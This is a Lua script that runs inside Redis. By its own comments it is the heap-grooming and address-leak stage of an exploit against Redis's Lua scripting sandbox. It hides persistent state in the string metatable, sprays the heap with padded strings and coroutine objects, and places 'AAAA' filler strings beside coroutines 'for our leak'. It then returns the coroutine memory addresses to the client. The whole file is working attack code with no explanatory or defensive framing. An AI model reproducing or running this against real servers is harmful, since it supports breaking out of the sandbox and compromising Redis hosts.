local log = function(fmt, ...)
  redis.log(redis.LOG_NOTICE, string.format(fmt, ...))
end

local log_s = function(s)
  redis.log(redis.LOG_NOTICE, s)
end

-- We'll hide values that will persist across calls in the String default metatable
local GlobalState = getmetatable("")

GlobalState.prefixes1 = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
}

GlobalState.spray = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
}

GlobalState.salloc = {
  1,2,3,4,5,6,
}

GlobalState.calloc = {
  1,2,3,4,5,6,
}

local coro = function()
  coroutine.yield()
end

-- Prepare the heap
for i=1,#GlobalState.prefixes1 do
  GlobalState.prefixes1[i] = struct.pack("<H", i)
end

local j = 1
for i=1,#GlobalState.spray,2 do
  GlobalState.spray[i] = GlobalState.prefixes1[j] .. "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
  GlobalState.spray[i+1] = coroutine.create(coro)
  j = j + 1
end

-- We'll use one of these allocations for our leak
GlobalState.salloc[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "A"
GlobalState.calloc[1] = coroutine.create(coro)
GlobalState.salloc[2] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "B"
GlobalState.calloc[2] = coroutine.create(coro)
GlobalState.salloc[3] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "C"
GlobalState.calloc[3] = coroutine.create(coro)
GlobalState.salloc[4] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "D"
GlobalState.calloc[4] = coroutine.create(coro)
GlobalState.salloc[5] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "E"
GlobalState.calloc[5] = coroutine.create(coro)
GlobalState.salloc[6] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .. "F"
GlobalState.calloc[6] = coroutine.create(coro)

-- Return the coroutine addresses to our client
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[1]))
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[2]))
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[3]))
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[4]))
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[5]))
redis.call('RPUSH', KEYS[1], tostring(GlobalState.calloc[6]))
